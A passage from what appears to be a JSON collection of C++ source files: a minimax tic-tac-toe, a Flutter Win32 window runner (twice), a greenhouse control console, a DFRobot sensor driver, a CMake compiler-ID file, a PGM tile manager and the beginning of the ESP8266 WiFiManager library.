createBinaryTree(move, player, depth - 1);\n      node->children.push_back(childNode);\n    }\n  }\n  return node;\n}\n\nint minMaxAlgorithm(Node* node, int depth, bool isMaximizingPlayer) {\n  if (depth == 0 || node->children.empty()) {\n    return node->value;\n  }\n  if (isMaximizingPlayer) {\n    int maxEval = -10000;\n    for (Node* child : node->children) {\n      int eval = minMaxAlgorithm(child, depth - 1, false);\n      maxEval = max(maxEval, eval);\n    }\n    return maxEval;\n  } else {\n    int minEval = 10000;\n    for (Node* child : node->children) {\n      int eval = minMaxAlgorithm(child, depth - 1, true);\n      minEval = min(minEval, eval);\n    }\n    return minEval;\n  }\n}\n/*\nvoid gameLogic() {\n  // Implementaci\u00f3n de la funci\u00f3n\n  // ...\n}\n\nvoid display() {\n  glClear(GL_COLOR_BUFFER_BIT);\n  gameLogic();\n  glutSwapBuffers();\n}\n*/\nint main(/*int argc, char** argv*/) {\n  vector<vector<int>> board = {{0, 0, 0}, {0, 0, 0}, {0, 0, 0}};\n  Node* root = createBinaryTree(board, 1, 3);\n  int result = minMaxAlgorithm(root, 3, true);\n  cout << \"Resultado: \" << result << endl;\n  /*glutInit(&argc, argv);\n  glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGB);\n  glutInitWindowSize(500, 500);\n  glutCreateWindow(\"3 en raya\");\n  glutDisplayFunc(display);\n  glutMainLoop();*/\n  return 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <string>\n#include <algorithm>\n\nfloat temp_val, right_val, humidity_val, light_start, temp_start, humidifier_start, current_api_flow, thresh_temp, thresh_light, thresh_humidifier;\n\nfloat read_temp();\nbool read_light();\nfloat read_humidity();\n\nvoid operate_light(bool state);\nvoid operate_fan(bool state);\nvoid operate_humidifier(bool state);\n\nvoid set_temp_thresh(float value);\nvoid set_light_thresh(bool state);\nvoid set_humidifier_thresh(float value);\n//void set_api_flow();\n\nfloat read_temp()\n{\n    //temp_val = ;\n    return temp_val;\n}\n\nbool read_light()\n{\n    // light_start = ;\n    return light_start > thresh_light;\n}\n\nfloat read_humidity()\n{\n    // humidity_val = ;\n    return humidity_val;\n}\n\nvoid operate_light(bool state)\n{\n    if (state)\n        std::cout << \"Light turned ON\" << std::endl;\n    else\n        std::cout << \"Light turned OFF\" << std::endl;\n}\n\nvoid operate_fan(bool state)\n{\n    if (state)\n        std::cout << \"Fan turned ON\" << std::endl;\n    else\n        std::cout << \"Fan turned OFF\" << std::endl;\n}\n\nvoid operate_humidifier(bool state)\n{\n    if (state)\n        std::cout << \"Humidifier turned ON\" << std::endl;\n    else\n        std::cout << \"Humidifier turned OFF\" << std::endl;\n}\n\nvoid set_temp_thresh(float value)\n{\n    if (value >= -10 && value <= 120)\n    {\n        thresh_temp = value;\n        std::cout << \"Temperature threshold set to: \" << thresh_temp << std::endl;\n    }\n    else {\n        std::cout << \"Invalid temperature value. Please enter a value between -10 and 120 Celsius.\" << std::endl;\n    }\n}\n\nvoid set_light_thresh(bool state)\n{\n    thresh_light = state ? 1 : 0;\n    std::cout << \"Light threshold set to: \" << (state ? \"ON\" : \"OFF\") << std::endl;\n}\n\nvoid set_humidifier_thresh(float value)\n{\n    if (value >= 0 && value <= 100)\n    {\n        thresh_humidifier = value;\n        std::cout << \"Humidifier threshold set to: \" << thresh_humidifier << \"%\" << std::endl;\n    }\n    else {\n        std::cout << \"Invalid humidifier value. Please enter a value between 0 and 100.\" << std::endl;\n    }\n}\n\nint main()\n{\n    std::string userInput;\n    while (true)\n    {\n        std::cout << \"Enter a command: \";\n        std::getline(std::cin, userInput);\n\n        std::transform(userInput.begin(), userInput.end(), userInput.begin(), ::tolower);\n\n        if (userInput == \"read temp\")\n        {\n            float temp = read_temp();\n            std::cout << \"Current Temperature: \" << temp << \"\u00b0C\" << std::endl;\n        }\n        else if (userInput == \"read light\")\n        {\n            bool light = read_light();\n            std::cout << \"Light is \" << (light ? \"ON\" : \"OFF\") << std::endl;\n        }\n        else if (userInput == \"read humidifier\")\n        {\n            float humidity = read_humidity();\n            std::cout << \"Current Humidity: \" << humidity << \"%\" << std::endl;\n        }\n        else if (userInput.find(\"set temp to \") != std::string::npos)\n        {\n            float value = std::stof(userInput.substr(11));\n            set_temp_thresh(value);\n        }\n        else if (userInput.find(\"set light to \") != std::string::npos)\n        {\n            std::string stateStr = userInput.substr(13);\n            bool state = (stateStr == \"on\");\n            set_light_thresh(state);\n        }\n        else if (userInput.find(\"set humidifier to \") != std::string::npos)\n        {\n            float value = std::stof(userInput.substr(18));\n            set_humidifier_thresh(value);\n        }\n        else if (userInput == \"quit\")\n        {\n            break;\n        }\n        else\n        {\n            std::cout << \"Invalid command. Please try again.\" << std::endl;\n        }\n    }\n\n    return 0;\n}\n",
    "/*!\n * @file DFRobet_ColorTemperature.cpp\n * @brief This is the implementation file for DFRobet_ColorTemperature\n * @copyright   Copyright (c) 2010 DFRobot Co.Ltd (http://www.dfrobot.com)\n * @license     The MIT License (MIT)\n * @author [TangJie](jie.tang@dfrobot.com)\n * @version  V1.0\n * @date  2024-04-01\n * @url https://github.com/DFRobot/DFRobet_ColorTemperature\n */\n\n#include \"DFRobet_ColorTemperature.h\"\n\nDFRobet_ColorTemperature::DFRobet_ColorTemperature(TwoWire *pWire)\n{\n  _pWire = pWire;\n  _addr = COLORTEMPERATURE_ADDR;\n};\n\nDFRobet_ColorTemperature::DFRobet_ColorTemperature(Stream *s):DFRobot_RTU(s)\n{\n  _s = s;\n  _addr = COLORTEMPERATURE_ADDR;\n};\n\nint8_t DFRobet_ColorTemperature::begin(void)\n{\n  delay(500);\n  setTimeoutTimeMs(200);\n  \n  if(_addr > 0xF7){\n    DBG(\"Invaild Device addr.\");\n  }\n  if(_addr != 0){\n    if(!detectDeviceAddress(_addr)){\n      DBG(\"Device addr Error.\");\n      return -1;\n    }\n  }else{\n    return -1;\n  }\n  return 0;\n}\n\nuint16_t DFRobet_ColorTemperature::readLUX(void)\n{\n  uint16_t data = 0;\n  uint8_t buffer[4];\n  readReg(COLORTEMPERATURE_LUX_REG,buffer,2);\n  if(_pWire){\n    data = buffer[1] << 8 | buffer[0];\n  }else{\n    data = buffer[0] << 8 | buffer[1];\n  }\n  \n  return data;\n}\n\nuint16_t DFRobet_ColorTemperature::readCCT(void)\n{\n  uint16_t data = 0;\n  uint8_t buffer[4];\n  readReg(COLORTEMPERATURE_CCT_REG,buffer,2);\n  if(_pWire){\n    data = buffer[1] << 8 | buffer[0];\n  }else{\n    data = buffer[0] << 8 | buffer[1];\n  }\n  return data;\n}\n\nfloat DFRobet_ColorTemperature::readX(void)\n{\n  float data = 0;\n  uint8_t buffer[4];\n  readReg(COLORTEMPERATURE_X_REG,buffer,2);\n  if(_pWire){\n    data = (float)(buffer[1] << 8 | buffer[0]) / 10000;\n  }else{\n    data = (float)(buffer[0] << 8 | buffer[1]) / 10000;\n  }\n  \n  return data;\n}\n\nfloat DFRobet_ColorTemperature::readY(void)\n{\n  float data = 0;\n  uint8_t buffer[4];\n  readReg(COLORTEMPERATURE_Y_REG,buffer,2);\n  if(_pWire){\n    data = (float)(buffer[1] << 8 | buffer[0]) / 10000;\n  }else{\n    data = (float)(buffer[0] << 8 | buffer[1]) / 10000;\n  }\n  return data;\n}\n\nbool  DFRobet_ColorTemperature::detectDeviceAddress(uint8_t addr)\n{\nuint8_t buf[2];\n  if(_pWire){\n  _pWire->begin();\n  }\n  readReg(COLORTEMPERATURE_ADDR_REG, buf, 2);\n  DBG((buf[0] << 8| buf[1]));\n  if(_pWire){\n    if(addr == ((buf[1] << 8| buf[0]) & 0xFF))\n    return true;\n  }else{\n    if(addr == ((buf[0] << 8| buf[1]) & 0xFF))\n    return true;\n  }\n  return false;\n}\n\nuint8_t DFRobet_ColorTemperature::readReg(uint16_t reg, void *pBuf, uint8_t size)\n{\n  uint8_t* _pBuf = (uint8_t*)pBuf;\n  \n    if(pBuf == NULL){\n      DBG(\"data error\");\n      return 0;\n    }\n  if(_pWire){\n    uint8_t _reg = reg;\n    _pWire->begin();\n    _pWire->beginTransmission(_addr);\n    _pWire->write(_reg);\n    _pWire->endTransmission();\n    _pWire->requestFrom(_addr, size);\n    for(uint8_t i = 0; i < size; i++)\n      _pBuf[i] = _pWire->read();\n    \n    return size;\n  }else{\n    return readInputRegister(_addr, reg, _pBuf, size);\n  }\n}\n\n// uint8_t DFRobet_ColorTemperature::writeReg(uint8_t reg, void *pBuf, size_t size)\n// {\n//   uint8_t *_pBuf = (uint8_t*)pBuf;\n\n//   uint8_t ret = 0;\n//   if(_pWire){\n//     uint8_t _reg = reg+5;\n//     _pWire->beginTransmission(_addr);\n//     _pWire->write(_reg);\n//     for(uint8_t i = 0; i < size;){\n//       uint8_t temp = _pBuf[i];\n//       _pBuf[i] = _pBuf[i+1];\n//       _pBuf[i+1] = temp;\n//       i+=2;\n//     }\n//     for(size_t i = 0; i < size; i++){\n//       _pWire->write(_pBuf[i]);\n//     }\n//     _pWire->endTransmission();\n//   }else{\n//     ret = writeHoldingRegister(_addr,reg,_pBuf,size);\n//   }\n//   return ret;\n// }",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <cstring>\n#include \"TileManager.h\"\n\nint main(int argc, char* argv []){\n    using namespace std;\n    ifstream myfile;\n    string str;\n    string width;\n    string height;\n    int gridSize;\n    int numMoves;\n    string outputName;\n    string summaryName;\n    if(argc!=10){\n        cout << \"Incorrect number of arguments.\";\n        return 1;\n    }\n    for (int i = 0; i < argc; i++)\n    {\n        if (strcmp(argv[i], \"-s\")==0){\n            gridSize = stoi(argv[i+1]);\n             if(gridSize%2==0){\n                cout << \"Grid size must be an odd number.\";\n                return 1;\n            }\n            i++;\n            continue;\n        }\n        if(strcmp(argv[i], \"-i\")==0){\n            outputName = argv[i+1];\n            i++;\n            continue;\n        }\n        if(strcmp(argv[i], \"-n\")==0){\n            numMoves = stoi(argv[i+1]);\n            if(numMoves<0){\n                cout << \"Number of moves should be greater than or equal to 0.\";\n                return 1;\n            }\n            i++;\n            continue;\n        }\n        if(strcmp(argv[i], \"-x\")==0){\n            summaryName = argv[i+1];\n            i++;\n            continue;\n        }\n    } \n    myfile.open(argv[9], ios::binary);\n    if (!myfile.is_open()) { \n        cout << \"File open failed!\"; \n        return 1;\n    }\n    getline(myfile, str); //read first line (P5)\n    while(getline(myfile, str)){ \n        if(str[0]!='#'){\n            istringstream s(str);\n            s >> width >> height;\n            break;\n        }\n    }\n    getline(myfile, str); //read last line before binary block (255)\n    int widthVal = stoi(width);\n    int heightVal = stoi(height);\n    int numEntries = widthVal * heightVal;\n    unsigned char * buffer = new unsigned char [numEntries];\n    myfile.read((char*)buffer,numEntries);\n    ANXTEM001::TileManager tileManager(numMoves ,gridSize , gridSize*gridSize, widthVal, heightVal, buffer,outputName, summaryName);\n    return 0;\n}\n\n",
    "/**************************************************************\r\n   WiFiManager is a library for the ESP8266/Arduino platform\r\n   (https://github.com/esp8266/Arduino) to enable easy\r\n   configuration and reconfiguration of WiFi credentials using a Captive Portal\r\n   inspired by:\r\n   http://www.esp8266.com/viewtopic.php?f=29&t=2520\r\n   https://github.com/chriscook8/esp-arduino-apboot\r\n   https://github.com/esp8266/Arduino/tree/master/libraries/DNSServer/examples/CaptivePortalAdvanced\r\n   Built by AlexT https://github.com/tzapu\r\n   Licensed under MIT license\r\n **************************************************************/\r\n\r\n#include \"WiFiManager.h\"\r\nstruct WC_Config EC_Config;\r\n\r\nWiFiManagerParameter::WiFiManagerParameter(const char *custom) {\r\n  _id = NULL;\r\n  _placeholder = NULL;\r\n  _length = 0;\r\n  _value = NULL;\r\n\r\n  _customHTML = custom;\r\n}\r\n\r\nWiFiManagerParameter::WiFiManagerParameter(const char *id, const char *placeholder, const char *defaultValue, int length) {\r\n  init(id, placeholder, defaultValue, length, \"\");\r\n}\r\n\r\nWiFiManagerParameter::WiFiManagerParameter(const char *id, const char *placeholder, const char *defaultValue, int length, const char *custom) {\r\n  init(id, placeholder, defaultValue, length, custom);\r\n}\r\n\r\nvoid WiFiManagerParameter::init(const char *id, const char *placeholder, const char *defaultValue, int length, const char *custom) {\r\n  _id = id;\r\n  _placeholder = placeholder;\r\n  _length = length;\r\n  _value = new char[length + 1];\r\n  for (int i = 0; i < length + 1; i++) {\r\n    _value[i] = 0;\r\n  }\r\n  if (defaultValue != NULL) {\r\n    strncpy(_value, defaultValue, length);\r\n  }\r\n\r\n  _customHTML = custom;\r\n}\r\n\r\nWiFiManagerParameter::~WiFiManagerParameter() {\r\n  if (_value != NULL) {\r\n    delete[] _value;\r\n  }\r\n}\r\n\r\nconst char* WiFiManagerParameter::getValue() {\r\n  return _value;\r\n}\r\nconst char* WiFiManagerParameter::getID() {\r\n  return _id;\r\n}\r\nconst char* WiFiManagerParameter::getPlaceholder() {\r\n  return _placeholder;\r\n}\r\nint WiFiManagerParameter::getValueLength() {\r\n  return _length;\r\n}\r\nconst char* WiFiManagerParameter::getCustomHTML() {\r\n  return _customHTML;\r\n}\r\n\r\n\r\nWiFiManager::WiFiManager() {\r\n    _max_params = WIFI_MANAGER_MAX_PARAMS;\r\n    _params = (WiFiManagerParameter**)malloc(_max_params * sizeof(WiFiManagerParameter*));\r\n}\r\n\r\nWiFiManager::~WiFiManager()\r\n{\r\n    if (_params != NULL)\r\n    {\r\n        DEBUG_WM(F(\"freeing allocated params!\"));\r\n        free(_params);\r\n    }\r\n}\r\n\r\nbool WiFiManager::addParameter(WiFiManagerParameter *p) {\r\n  if(_paramsCount + 1 > _max_params)\r\n  {\r\n    // rezise the params array\r\n    _max_params += WIFI_MANAGER_MAX_PARAMS;\r\n    DEBUG_WM(F(\"Increasing _max_params to:\"));\r\n    DEBUG_WM(_max_params);\r\n    WiFiManagerParameter** new_params = (WiFiManagerParameter**)realloc(_params, _max_params * sizeof(WiFiManagerParameter*));\r\n    if (new_params != NULL) {\r\n      _params = 